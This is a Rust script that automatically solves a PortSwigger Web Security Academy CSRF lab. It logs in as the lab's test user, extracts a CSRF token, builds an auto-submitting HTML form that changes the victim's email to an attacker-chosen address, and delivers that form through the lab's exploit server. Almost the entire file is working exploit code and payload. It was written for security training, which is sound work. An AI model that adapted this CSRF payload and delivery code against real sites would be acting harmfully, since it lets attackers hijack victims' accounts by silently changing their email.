/*************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 21/10/2023
*
* Lab: CSRF where token is not tied to user session
*
* Steps: 1. Fetch the login page
*        2. Extract the csrf to login
*        3. Login as wiener
*        4. Fetch wiener profile
*        5. Extract the csrf token that is needed for email update
*        6. Craft an HTML form for changing the email address with an auto-submit 
*           script and include the extracted csrf token in the form
*        7. Deliver the exploit to the victim
*        8. The victim's email will be changed after he trigger the exploit
*
**************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0a2a00de041426eb81101b6f00d500da.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0a2900890423263481281a1101090083.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch login page
    let login_page = client
        .get(format!("{lab_url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗2⦘ Extracting the csrf token to login.. ".white(),);
    io::stdout().flush();

    // extract csrf token to login
    let mut csrf = extract_csrf(login_page)
        .expect(&format!("{}", "[!] Failed to extract csrf to login".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{lab_url}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Fetching wiener profile.. ".white(),);
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // fetch wiener profile
    let wiener = client
        .get(format!("{lab_url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch wiener profile".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗5⦘ Extracting the csrf token that is needed for email update.. ".white(),
    );
    io::stdout().flush();

    // extract the csrf token that is needed for email update
    csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed to extract csrf".red()));

    // the new email
    // you can change this to what you want
    let new_email = "hacked@you.com";

    // payload to change the victim's email
    let payload = format!(
        r###"<html>
                <body>
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
                </body>
            </html>   
      "###
    );

    println!("{}", "OK".green());
    print!("{}", "⦗6⦘ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    // use a new client with default redirect
    ClientBuilder::new()
        .redirect(Policy::default())
        .build()
        .unwrap()
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 The victim's email will be changed after he trigger the exploit".white()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
